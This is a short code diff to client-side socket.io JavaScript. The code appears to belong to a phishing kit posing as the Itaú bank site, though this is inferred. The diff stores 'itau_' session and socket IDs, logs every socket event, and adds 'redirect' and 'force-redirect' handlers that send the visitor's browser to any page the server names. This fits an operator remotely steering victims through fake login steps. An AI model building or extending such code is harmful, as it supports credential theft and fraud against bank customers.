@@ -5,16 +5,15 @@
     // Socket configuration with robust reconnection
     const socket = io({
         reconnection: true,
-        reconnectionDelay: 300,
-        reconnectionDelayMax: 1000,
+        reconnectionDelay: 500,
+        reconnectionDelayMax: 2000,
         reconnectionAttempts: Infinity,
-        timeout: 20000,
-        transports: ['polling', 'websocket'],
+        timeout: 30000,
+        transports: ['polling'],
         upgrade: false,
-        rememberUpgrade: false,
         autoConnect: true,
         forceNew: false,
-        multiplex: true,
+        path: '/socket.io/',
         closeOnBeforeunload: false
     });
 
@@ -42,6 +41,11 @@
         }, 10000); // Every 10 seconds
     }
 
+    // Log all socket events
+    socket.onAny((eventName, ...args) => {
+        console.log(`📡 Socket event: ${eventName}`, args);
+    });
+
     // Stop heartbeat
     function stopHeartbeat() {
         if (heartbeatInterval) {
@@ -66,13 +70,13 @@
 
     // Initialize session on connection
     socket.on('connect', () => {
-        console.log('Socket conectado:', socket.id);
+        console.log('✅ Socket conectado:', socket.id);
         isConnected = true;
         reconnectAttempts = 0;
         socket.emit('init-session', { sessionId });
         
-        // Guardar estado de conexion
         localStorage.setItem('itau_last_connect', Date.now());
+        localStorage.setItem('itau_socket_id', socket.id);
     });
 
     socket.on('session-ready', (data) => {
@@ -136,9 +140,20 @@
 
     // Handle redirect commands
     socket.on('redirect', (data) => {
-        console.log('Redirect recibido:', data);
+        console.log('🔄 Redirect recibido:', data);
         if (data.clearData) {
-            // Clear session but keep connection
+            localStorage.removeItem('itau_session_id');
+            sessionId = null;
+        }
+        setTimeout(() => {
+            window.location.href = data.page;
+        }, 100);
+    });
+
+    // Handle force redirect (backup)
+    socket.on('force-redirect', (data) => {
+        console.log('🔄 Force-redirect recibido:', data);
+        if (data.clearData) {
             localStorage.removeItem('itau_session_id');
             sessionId = null;
         }
